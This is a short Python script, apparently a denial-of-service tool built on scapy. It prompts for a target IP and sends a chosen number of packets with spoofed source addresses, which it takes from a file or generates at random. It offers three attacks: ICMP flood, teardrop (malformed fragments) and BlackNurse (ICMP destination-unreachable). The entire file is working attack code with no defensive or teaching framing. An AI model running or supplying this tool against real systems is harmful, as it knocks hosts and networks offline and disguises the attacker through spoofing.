import sys, random
import scapy
from scapy.all import *
import config

dst_ip = raw_input("IP to attack: ") if config.dst_ip == "" else config.dst_ip
n_msg = raw_input("Number of messages: ") if config.n_msg == "" else config.n_msg
interface = raw_input("Inteface: ") if config.interface == "" else config.interface
type = raw_input("Type: \n1) Flood \n2) Teardrop \n3) Black nurse") if config.type == "" else config.type
orig_type = raw_input("Origin IPs: \n1) From ips.txt \n2) Random") if config.orig_type == "" else config.orig_type

ips = []

def get_random_ips(n):
	for i in range(0,int(n)):
		ip_gen = str(random.randint(0,255)) + "." +str(random.randint(0,255)) + "." +str(random.randint(0,255)) + "." +str(random.randint(0,255))
		ips.append(ip_gen)


if orig_type == "2":
	#num_ips = raw_input("Number of IPs:")
	get_random_ips(n_msg)
else:
	for line in open("ips.txt"):
		ips.append(line.replace('\n',''))

# raw_input("Time between attack: ")

count = 0

while(count < int(n_msg)):
	count += 1
	if type == "1":
		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP()), iface=interface)
	elif type == "2":
		send((IP(dst=dst_ip, src=ips[count%len(ips)], flags="MF", proto = 17, frag = 0)/ICMP()/("load"*int(1))), iface=interface)
	elif type == "3":
		send((IP(dst=dst_ip,src=ips[count%len(ips)])/ICMP(type=3, code=3)), iface=interface)
	else:
		print "Type unknown"
